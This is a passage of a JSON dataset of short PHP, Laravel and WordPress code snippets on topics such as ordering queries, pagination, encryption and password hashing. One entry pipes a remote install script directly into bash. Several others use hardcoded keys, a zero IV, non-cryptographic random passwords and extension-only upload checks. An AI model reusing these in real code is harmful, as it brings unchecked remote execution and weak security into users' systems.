    "description": "//Using oci8 to connect to Oracle Database. //oci_execute(): ORA-01810: format code appears twice   SQL> SELECT  TO_TIMESTAMP('20151206 00:00:00', 'yyyy/mm/dd hh:mm:ss') FROM dual; SELECT  TO_TIMESTAMP('20151206 00:00:00', 'yyyy/mm/dd hh:mm:ss') FROM dual                                           * ERROR at line 1: ORA-01810: format code appears twice    //Reason for error is that 'mm' appear in ('yyyymmdd') and ('hh:mm:ss') while  //minutes are denoted as 'mi and 'mm' as months. \n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2987,
    "keyword": null,
    "link": null,
    "title": " old function use in checkbox selected in laravel blade",
    "description": "// old selected checkbox in blade template using old function <label class=\"form-check-inline\">     <input class=\"form-check-input\" type=\"checkbox\" name=\"hobby[]\" value=\"1\"  \t{{ (is_array(old('hobby')) && in_array(1, old('hobby'))) ? ' checked' : '' }}> football </label> //@sujay\n",
    "reg_date": "2021-10-12T10:17:13.000Z"
  },
  {
    "id": 2988,
    "keyword": null,
    "link": null,
    "title": " one lin if statement php",
    "description": "/* most basic usage */ $var = 5; $var_is_greater_than_two = ($var > 2 ? true : false); // returns true\n<?php echo ($requestVars->_name == '') ? $redText : ''; ?>\necho ($var1 >= $var2) ? 'this is true' : 'this is false';\n<?php if ($requestVars->_name == '') echo $redText; ?>\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2989,
    "keyword": null,
    "link": null,
    "title": " one to many laravel",
    "description": "use Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); })->get();  // Retrieve posts with at least ten comments containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); }, '>=', 10)->get();\nFor example, a blog post may have an infinite number of comments. And a single comment belongs to only a single post    class Post extends Model {     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }  class Comment extends Model {     public function post()     {         return $this->belongsTo('App\\Models\\Post');     } }\nuse Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); })->get();  // Retrieve posts with at least ten comments containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); }, '>=', 10)->get();\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     /**      * Get the comments for the blog post.      */     public function comments()     {         return $this->hasMany(Comment::class);     } }\nSuppose you have a Post model with a hasMany relationship with Comment. You may insert a Comment object related to a post by doing the following:  $post = Post::find(1); $commentToAdd = new Comment(['message' => 'This is a comment.']); $post->comments()->save($commentToAdd); \n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2990,
    "keyword": null,
    "link": null,
    "title": " online password generator in php",
    "description": "<?php function randomPassword() {     $alphabet = \"abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789\";     $pass = array(); //remember to declare $pass as an array     $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache     for ($i = 0; $i < 8; $i++) {         $n = rand(0, $alphaLength);         $pass[] = $alphabet[$n];     }     return implode($pass); //turn the array into a string }  echo randomPassword(); ?> \n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2991,
    "keyword": null,
    "link": null,
    "title": " only date in php",
    "description": "date('Y:m:d', strtotime($date))\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2992,
    "keyword": null,
    "link": null,
    "title": " only display part of string php",
    "description": " <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n$firstStringCharacter = substr(\"hello\", 0, 1);\nsubstr('abcdef', 1);     // bcdef substr('abcdef', 1, 3);  // bcd substr('abcdef', 0, 8);  // abcdef substr('abcdef', -1, 1); // f\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2993,
    "keyword": null,
    "link": null,
    "title": " open json file php",
    "description": "$filedata = file_get_contents('filename.json'); $details = json_decode($filedata); print_r($details);\n// Get the contents of the JSON file  $strJsonFileContents = file_get_contents(\"css-color-names.json\"); var_dump($strJsonFileContents); // show contentsCopy\n$json = json_decode(file_get_contents('/path/to/your/file.json'));\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2994,
    "keyword": null,
    "link": null,
    "title": " open pdf file in browser php",
    "description": "<?php     // Store the file name into variable     $file = 'filename';     $filepath = \"https://www.example.com/\".$file;     // Header content type     header(\"Content-type: application/pdf\");     // Send the file to the browser.     readfile($filepath); \n<html> <head> <title>  FORM </title> </head> <body align=\"left\"> <h1> FILE UPLOAD </h1>  <form action = \"term5b.php\" method = \"POST\" enctype=\"multipart/form-data\"/>      <input type = \"file\" name = \"fileupload\"/></br>       <input type = \"submit\" name = \"opt\" value = \"upload\"/></br> </br>    </form> </body> </html>        <?php    $target_dir=\"E:\\ \";    $filename=$_FILES[\"fileupload\"][\"name\"];     $tmpname=$_FILES[\"fileupload\"][\"tmp_name\"];    $filetype=$_FILES[\"fileupload\"][\"type\"];    $errors=[];    $fileextensions=[\"pdf\"]; \t$arr=explode(\".\",$filename);    $ext=strtolower(end($arr));     $uploadpath=$target_dir.basename($filename); if(! in_array($ext,$fileextensions))    {      $errors[]=\"Invalid filename\";    }    if(empty($errors))    {      if(move_uploaded_file($tmpname,$uploadpath))      {        echo \"file uploaded successfully\";      }      else      {        echo \"not successfull\";      }    }    else    {       foreach($errors as $value)       {          echo \"$value\";       }    } ?> \n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2995,
    "keyword": null,
    "link": null,
    "title": " open php ini from terminal",
    "description": "php --ini\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2996,
    "keyword": null,
    "link": null,
    "title": " openssl encrypt php",
    "description": "function encrypt_decrypt($string, $action = 'encrypt') {     $encrypt_method = \"AES-256-CBC\";     $secret_key = 'AA74CDCC2BBRT935136HH7B63C27'; // user define private key     $secret_iv = '5fgf5HJ5g27'; // user define secret key     $key = hash('sha256', $secret_key);     $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo     if ($action == 'encrypt') {         $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);         $output = base64_encode($output);     } else if ($action == 'decrypt') {         $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);     }     return $output; }   echo \"Your Encrypted password is = \". $pwd = encrypt_decrypt('spaceo', 'encrypt'); echo \"Your Decrypted password is = \". encrypt_decrypt($pwd, 'decrypt'); \n$textToEncrypt = \"My super secret information.\"; $encryptionMethod = \"AES-256-CBC\";  // AES is used by the U.S. gov't to encrypt top secret documents. $secretHash = \"25c6c7ff35b9979b151f2136cd13b0ff\";  //To encrypt $encryptedMessage = openssl_encrypt($textToEncrypt, $encryptionMethod, $secretHash);  //To Decrypt $decryptedMessage = openssl_decrypt($encryptedMessage, $encryptionMethod, $secretHash);  //Result echo \"Encrypted: $encryptedMessage <br>Decrypted: $decryptedMessage\";\nfunction rw_hash($string, $encrypt = true) \t{ \t\t$encrypt_method = \"AES-256-CBC\"; \t\t$secret_key = \"AA74CDCC2BBRT935136HH7B63C27\"; // user define private key \t\t$secret_iv = \"RwS3cr3t\"; // user define secret key \t\t$key = hash(\"sha256\", $secret_key); \t\t$iv = substr(hash(\"sha256\", $secret_iv), 0, 16); // sha256 is hash_hmac_algo \t\tif ($encrypt) { \t\t\t$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv); \t\t\t$output = base64_encode($output); \t\t} else { \t\t\t$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv); \t\t} \t\treturn $output; \t}\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2997,
    "keyword": null,
    "link": null,
    "title": " operador in laravel",
    "description": "DB::table('NameTable') ->select('*') ->whereIn() ->get();\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2998,
    "keyword": null,
    "link": null,
    "title": " option value selected in laravel blade",
    "description": "{{ old('title') == '1' ? 'selected' : '' }} <div class=\"form-group col-md-6\"> <label>Nationality {{$profiledata->nationality}}</label>    <select id=\"nationality\" required=\"\" name=\"nationality\" class=\"form-control\">     <option value=\"\">--Select--</option>     <option {{ ($profiledata->nationality) == 'United State' ? 'selected' : '' }}  value=\"United State\">United State</option>     <option {{ ($profiledata->nationality) == 'India' ? 'selected' : '' }}  value=\"India\">India</option>     <option {{ ($profiledata->nationality) == 'Canada' ? 'selected' : '' }}  value=\"Canada\">Canada</option>   </select> </div>\n",
    "reg_date": "2021-10-12T10:17:14.000Z"
  },
  {
    "id": 2999,
    "keyword": null,
    "link": null,
    "title": " order By Asc in laravbel",
    "description": "->orderBy('id', 'DESC');\n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3000,
    "keyword": null,
    "link": null,
    "title": " order by date wp php",
    "description": "$query = new WP_Query(array(     'post_status' => 'publish',     'orderby' => 'publish_date',     'order' => 'DESC'   )); //DESC sorts by newest, ASC by oldest. GL fellow grepper user\n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3001,
    "keyword": null,
    "link": null,
    "title": " order by in datatable laravel",
    "description": "$('#datatable').DataTable({     \"order\": [[ 2, \"asc\" ]] // Order on init. # is the column, starting at 0 });\n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3002,
    "keyword": null,
    "link": null,
    "title": " order by meta query wordpress",
    "description": "$q = new WP_Query(      array(         'meta_key' => 'population', //setting the meta_key which will be used to order         'orderby' => 'meta_value', //if the meta_key (population) is numeric use meta_value_num instead         'order' => 'DESC', //setting order direction         'meta_query' => array(             'relation' => 'AND', //setting relation between queries group             array(                 'relation' => 'OR', //setting relation between this inside query                 array(                     'key' => 'state',                     'value' => 'Wisconsin',                 ),                 array(                     'key' => 'timezone',                     'value' => 'central',                 )             ),             array(                 'key' => 'city',                 'compare' => 'EXISTS',             )         )     )            ); \n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3003,
    "keyword": null,
    "link": null,
    "title": " order by sum() laravel",
    "description": "Auth::user()->orderByRaw('SUM(points) DESC')->get();\n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3004,
    "keyword": null,
    "link": null,
    "title": " orderby in laravel",
    "description": "->orderBy('id', 'DESC');\n$users = DB::table('users')          -> orderBy('name', 'desc')          -> get();\n/**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get();        dd($messages); }\n// Make sure column names are correct $inquiries = Inquiry::orderBy('status', 'ASC')     ->orderBy('created_at', 'DESC')     ->get();  \n$inquiries = Inquiry::all()->sortByDesc('created_at')->sortByDesc('Status')->values(); \n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3005,
    "keyword": null,
    "link": null,
    "title": " orwherebetween laravel",
    "description": "$users = DB::table('users')            ->orWhereBetween('votes', [1, 100])            ->get();\n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3006,
    "keyword": null,
    "link": null,
    "title": " osx php",
    "description": "curl -s https://php-osx.liip.ch/install.sh | bash -s 7.3 \nexport PATH=/usr/local/php5/bin:$PATH \n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3007,
    "keyword": null,
    "link": null,
    "title": " overloading and overriding in php",
    "description": "class Shape {    const Pi = 3.142 ;  // constant value   function __call($functionname, $argument){     if($functionname == 'area')     switch(count($argument)){         case 0 : return 0 ;         case 1 : return self::Pi * $argument[0] ; // 3.14 * 5         case 2 : return $argument[0] * $argument[1];  // 5 * 10     }    }   }  $circle = new Shape();`enter code here`  echo \"Area of circle:\".$circle->area().\"</br>\"; // display the area of circle Output 0  echo \"Area of circle:\".$circle->area(5).\"</br>\"; // display the area of circle  $rect = new Shape();  echo \"Area of rectangle:\".$rect->area(5,10); // display area of rectangle \n<?php  class Foo {    function myFoo() {       return \"Foo\";    } }  class Bar extends Foo {    function myFoo() {       return \"Bar\";    } }  $foo = new Foo; $bar = new Bar; echo($foo->myFoo()); //\"Foo\" echo($bar->myFoo()); //\"Bar\" ?> \n",
    "reg_date": "2021-10-12T10:17:15.000Z"
  },
  {
    "id": 3008,
    "keyword": null,
    "link": null,
    "title": " override belongto parent appmodel cakephp",
    "description": "// ------------------------------------------------------------- // ------------ Override belongto parent appmodel -------------- // ------------------------------------------------------------- public function __construct($id = false, $table = null, $ds = null) {     $parent = get_parent_class($this);     $this->_mergeVars(array('belongsTo'), $parent);\t// override belongto parent appmodel      parent::__construct($id, $table, $ds); }\n'joins' => array(         array(             'table' => Environment::read('table_prefix') . 'image_type_languages',              'alias' => 'language',             'type' => 'INNER',             'conditions'=> array(                 'ImageType.id = language.image_type_id',                 'language.alias = \\'' . $language . '\\'',             )         ),     ),\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3009,
    "keyword": null,
    "link": null,
    "title": " overwrite file php",
    "description": "file_put_contents('file.txt', 'bar'); echo file_get_contents('file.txt'); // bar file_put_contents('file.txt', 'foo'); echo file_get_contents('file.txt'); // foo \n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3010,
    "keyword": null,
    "link": null,
    "title": " page expire in laravel",
    "description": "<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\"> //if not work composer dump-autoload\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3011,
    "keyword": null,
    "link": null,
    "title": " paginate and sort 2nd level association",
    "description": "// link below https://en.it1352.com/article/3565133a7e174035a4e83f831c59008d.html   // Our case: MemberNotification -> BelongsTo -> Notification,  Notification -> HasMany -> NotificationLanguage  $this->MemberNotification->recursive = 0; $this->set('memberNotifications', $this->paginate()); $this->MemberNotification->bindModel(array(     'belongsTo' => array(         'NotificationLanguage' => array(             'foreignKey' => false,             'conditions' => array('Notification.id = NotificationLanguage.notification_id')         ),     ) ));  // our purpose just make the NotificationLanguage same level with the Notification, show we can sort 2nd level association  // on the view <th><?php echo $this->Paginator->sort('NotificationLanguage.title', 'Region'); ?></th>  // we cannot use below code, cannot run: xxxxxx <th><?php echo $this->Paginator->sort('Notification.NotificationLanguage.title', 'Region'); ?></th>     \n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3012,
    "keyword": null,
    "link": null,
    "title": " paginate relationship laravel7",
    "description": "$category = Category::first(); $apps = $category->apps()->paginate(10); return view('example', compact('category', 'apps'));\n@foreach ($apps as $app)     {{ $app->id }} @endforeach  {!! $apps->render() !!}\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3013,
    "keyword": null,
    "link": null,
    "title": " pagination html php",
    "description": " <html> <head>     <title>Pagination</title>     <!-- Bootstrap CDN -->     <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\">     <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>     <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script> </head> <body>     <?php          if (isset($_GET['pageno'])) {             $pageno = $_GET['pageno'];         } else {             $pageno = 1;         }         $no_of_records_per_page = 10;         $offset = ($pageno-1) * $no_of_records_per_page;          $conn=mysqli_connect(\"localhost\",\"my_user\",\"my_password\",\"my_db\");         // Check connection         if (mysqli_connect_errno()){             echo \"Failed to connect to MySQL: \" . mysqli_connect_error();             die();         }          $total_pages_sql = \"SELECT COUNT(*) FROM table\";         $result = mysqli_query($conn,$total_pages_sql);         $total_rows = mysqli_fetch_array($result)[0];         $total_pages = ceil($total_rows / $no_of_records_per_page);          $sql = \"SELECT * FROM table LIMIT $offset, $no_of_records_per_page\";         $res_data = mysqli_query($conn,$sql);         while($row = mysqli_fetch_array($res_data)){             //here goes the data         }         mysqli_close($conn);     ?>     <ul class=\"pagination\">         <li><a href=\"?pageno=1\">First</a></li>         <li class=\"<?php if($pageno <= 1){ echo 'disabled'; } ?>\">             <a href=\"<?php if($pageno <= 1){ echo '#'; } else { echo \"?pageno=\".($pageno - 1); } ?>\">Prev</a>         </li>         <li class=\"<?php if($pageno >= $total_pages){ echo 'disabled'; } ?>\">             <a href=\"<?php if($pageno >= $total_pages){ echo '#'; } else { echo \"?pageno=\".($pageno + 1); } ?>\">Next</a>         </li>         <li><a href=\"?pageno=<?php echo $total_pages; ?>\">Last</a></li>     </ul> </body> </html> \n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3014,
    "keyword": null,
    "link": null,
    "title": " pagination prestashop 1.7",
    "description": "{block name='pagination'}   {include file='_partials/pagination.tpl' pagination=$listing.pagination} {/block}\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3015,
    "keyword": null,
    "link": null,
    "title": " pakistan time zone",
    "description": "Asia/Karachi\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3016,
    "keyword": null,
    "link": null,
    "title": " palindrome in php",
    "description": "<?php  function palindrome($input) {     $middle = strlen($input) / 2;     $firstHalf = substr($input, 0, floor($middle));     $secondHalf = substr($input, ceil($middle));     return $firstHalf == strrev($secondHalf); }  echo palindrome(\"racecar\") ? \"Palindrome\" : \"Not a palindrome\";\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3017,
    "keyword": null,
    "link": null,
    "title": " parameterized function in php",
    "description": "<?PHP   //Adding two numbers     function add($x, $y) {       $sum = $x + $y;       echo \"Sum of two numbers is = $sum <br><br>\";     }      add(467, 943);   ?>\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3018,
    "keyword": null,
    "link": null,
    "title": " parametre grouping laravel quert",
    "description": "DB::table('users')             ->where('name', '=', 'John')             ->where(function ($query) {                 $query->where('votes', '>', 100)                       ->orWhere('title', '=', 'Admin');             })             ->get();\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3019,
    "keyword": null,
    "link": null,
    "title": " parse data from xml CDATA php",
    "description": "$xml_file_data = json_decode(json_encode(simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOCDATA),true), true);\n",
    "reg_date": "2021-10-12T10:17:16.000Z"
  },
  {
    "id": 3020,
    "keyword": null,
    "link": null,
    "title": " part of url php",
    "description": "    //https://www.google.com/search?key=1234 \t$url = $_SERVER['REQUEST_URI'];      $url_components = parse_url($url);      parse_str($url_components['query'], $params);      $key = $params['key'];   // key=1234\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3021,
    "keyword": null,
    "link": null,
    "title": " pasar datetime a string php",
    "description": "$theDate    = new DateTime('2020-03-08'); echo $stringDate = $theDate->format('Y-m-d H:i:s');  //output: 2020-03-08 00:00:00\n$date = date_create_from_format('d M, Y', '08 Mar, 2020'); echo $newFormat = date_format($date,\"Y/m/d H:i:s\");  //output: 2020/03/08 00:00:00\n$dateFormat = new DateTime(); // this will return current date echo $stringDate = $date->format(DATE_ATOM);  //output: 2020-03-08T12:54:56+01:00\n$date = explode(\"/\",date('d/m/Y/h/i/s') list($day,$month,$year,$hour,$min,$sec) = $date); echo $month.'/'.$day.'/'.$year.' '.$hour.':'.$min.':'.$sec;  //output: 03/08/2020 02:01:06\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3022,
    "keyword": null,
    "link": null,
    "title": " pass model in function laravel",
    "description": "public static function destroy($model,Request $request) { ... }\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3023,
    "keyword": null,
    "link": null,
    "title": " pass multiple parameters in laravel route",
    "description": "route('routeName',['param1' => param1,'param2' => param2]);\nroute('memberHelper',['status'=>$statusId,'member'=>$memberId]); \n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3024,
    "keyword": null,
    "link": null,
    "title": " pass parameter to view laravel",
    "description": "return view('home')->with('userName',$userName);\nRoute::get('/', function () {     return view('greeting', ['name' => 'James']); });\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3025,
    "keyword": null,
    "link": null,
    "title": " passing parameters with route keyword in blade laravel",
    "description": "<a href=\"{{ route('blog.by.slug', ['slug' => 'someslug']) }}\">...</a> \n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3026,
    "keyword": null,
    "link": null,
    "title": " passport generate key",
    "description": "php artisan passport:install\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3027,
    "keyword": null,
    "link": null,
    "title": " passport install",
    "description": "$ npm install passport-local \nphp artisan passport:install\n# Database Preparation // add api_token to users table Schema::table('users', function ($table) {     $table->string('api_token', 80)->after('password')                         ->unique()                         ->nullable()                         ->default(null); });  // Create token for existing users, code can also be added to registerController     $token = Str::random(60);     $user = User::find(1);     $user->api_token = hash('sha256', $token); // <- This will be used in client access     $user->save();    //config/auth.php     'guards' => [         'web' => [             'driver' => 'session',             'provider' => 'users',         ],          'api' => [             'driver' => 'token', // <- Add this entry             'provider' => 'users',             'hash' => false,         ],     ],                        //routes/api.php     // Add \"middleware('auth:api')\" as below         \tRoute::middleware('auth:api')->get('/user', function (Request $request) {         return $request->user();     });              //client access example (in Vue js)  axios.get('http://example.com/api/user',            {   headers: {      'Accept': 'application/json',      'Authorization': 'Bearer '+ 'user-api-token'   } }          )   .then(function (response) {   // handle success   console.log(response); })   .catch(function (error) {   // handle error   console.log(error); })  \n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3028,
    "keyword": null,
    "link": null,
    "title": " password change logout from wordpress",
    "description": "// Get current logged-in user. $user = wp_get_current_user();  // Change password. wp_set_password($new_password, $user->ID);  // Log-in again. wp_set_auth_cookie($user->ID); wp_set_current_user($user->ID); do_action('wp_login', $user->user_login, $user);\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3029,
    "keyword": null,
    "link": null,
    "title": " password encryption php",
    "description": "//hash password $hashed_password = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n <?php   //HASH a password with the default algorithm   echo password_hash('rasmuslerdorf', PASSWORD_DEFAULT); ?>  \nfunction encryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $encrypted = base64_encode(openssl_encrypt($password, $method, $sSalt, OPENSSL_RAW_DATA, $iv));     return $encrypted; }  function decryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $decrypted = openssl_decrypt(base64_decode($password), $method, $sSalt, OPENSSL_RAW_DATA, $iv);     return $decrypted; }\n",
    "reg_date": "2021-10-12T10:17:17.000Z"
  },
  {
    "id": 3030,
    "keyword": null,
    "link": null,
    "title": " password hash() php 7",
    "description": "// To hash the password, use password_hash(\"MySuperSafePassword!\", PASSWORD_DEFAULT)    // To compare hash with plain text, use password_verify(\"MySuperSafePassword!\", $hashed_password)\n//hash password $pass = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n//hash password $hashed_password = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n <?php /**  * Note that the salt here is randomly generated.  * Never use a static salt or one that is not randomly generated.  *  * For the VAST majority of use-cases, let password_hash generate the salt randomly for you  */ $options = [     'cost' => 11,     'salt' => mcrypt_create_iv(22, MCRYPT_DEV_URANDOM), ]; echo password_hash(\"rasmuslerdorf\", PASSWORD_BCRYPT, $options).\"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3031,
    "keyword": null,
    "link": null,
    "title": " password hash",
    "description": "<?php /**  * For the VAST majority of use-cases, let password_hash generate the salt randomly for you.  */ $password = 'idkWhatToUse';  $hashedPassword= password_hash($password, PASSWORD_DEFAULT); ?>\n$password = 'mypassword1';  $passwordHash = password_hash($password, PASSWORD_DEFAULT);//hash the password    echo password_verify('mypassword1', $passwordHash);//true, Yeah we match  echo password_verify('wrongpassword', $passwordHash); //false ,Ooops wrong password\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3032,
    "keyword": null,
    "link": null,
    "title": " password hash php",
    "description": "// To hash the password, use password_hash(\"MySuperSafePassword!\", PASSWORD_DEFAULT)    // To compare hash with plain text, use password_verify(\"MySuperSafePassword!\", $hashed_password)\n//hash password $pass = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n /* User's password. */ $password = 'my secret password';  /* Secure password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  \n <?php /**  * We just want to hash our password using the current DEFAULT algorithm.  * This is presently BCRYPT, and will produce a 60 character result.  *  * Beware that DEFAULT may change over time, so you would want to prepare  * By allowing your storage to expand past 60 characters (255 would be good)  */ echo password_hash(\"rasmuslerdorf\", PASSWORD_DEFAULT); ?>  \n//hash password $hashed_password = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n <?php echo 'Argon2i hash: ' . password_hash('rasmuslerdorf', PASSWORD_ARGON2I); ?>  \n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3033,
    "keyword": null,
    "link": null,
    "title": " password match laravel",
    "description": "1. $user = User::where('email', request('email'))->first(); 2. Hash::check(request('password'), $user->password);  This will return true or false based on whether or not the password matches.\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3034,
    "keyword": null,
    "link": null,
    "title": " password strength php",
    "description": "public function checkPassword($pwd, &$errors) {     $errors_init = $errors;      if (strlen($pwd) < 8) {         $errors[] = \"Password too short!\";     }      if (!preg_match(\"#[0-9]+#\", $pwd)) {         $errors[] = \"Password must include at least one number!\";     }      if (!preg_match(\"#[a-zA-Z]+#\", $pwd)) {         $errors[] = \"Password must include at least one letter!\";     }           return ($errors == $errors_init); }\n// Given password $password = 'user-input-pass';  // Validate password strength $uppercase = preg_match('@[A-Z]@', $password); $lowercase = preg_match('@[a-z]@', $password); $number    = preg_match('@[0-9]@', $password); $specialChars = preg_match('@[^\\w]@', $password);  if(!$uppercase || !$lowercase || !$number || !$specialChars || strlen($password) < 8) {     echo 'Password should be at least 8 characters in length and should include at least one upper case letter, one number, and one special character.'; }else{     echo 'Strong password.'; }\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3035,
    "keyword": null,
    "link": null,
    "title": " path of app directory in controller laravel",
    "description": "How to get base path(Project Root) in laravel ? base_path(); // Path of application root   How to get storage folder path in laravel ? storage_path(); // Path of storage/   How to get app folder path in laravel ? app_path(); // Path of app/\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3036,
    "keyword": null,
    "link": null,
    "title": " payizone",
    "description": "$ch = curl_init(\"https://service.payizone.com/token\"); $payload = json_encode( array( \"app_id\"=> 'M&uuml;şteri APP ID', \"app_secret\" => \"M&uuml;şteri APP SECRET\" ) ); curl_setopt( $ch, CURLOPT_POSTFIELDS, $payload ); curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json')); curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true ); $result = curl_exec($ch); curl_close($ch); $result = json_decode($result);\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3037,
    "keyword": null,
    "link": null,
    "title": " pdo connexion",
    "description": "$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\npublic static function connexionBDD()     {         $base = null;          try {             $base = new PDO('mysql:host=' . MYSQL_HOSTNAME . '; dbname=' . MYSQL_DATABASE . '', MYSQL_USERNAME, MYSQL_PASSWORD);         } catch (exception $e) {             die('Erreur ' . $e->getMessage());         }          return $base;     }\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3038,
    "keyword": null,
    "link": null,
    "title": " pdo db connection",
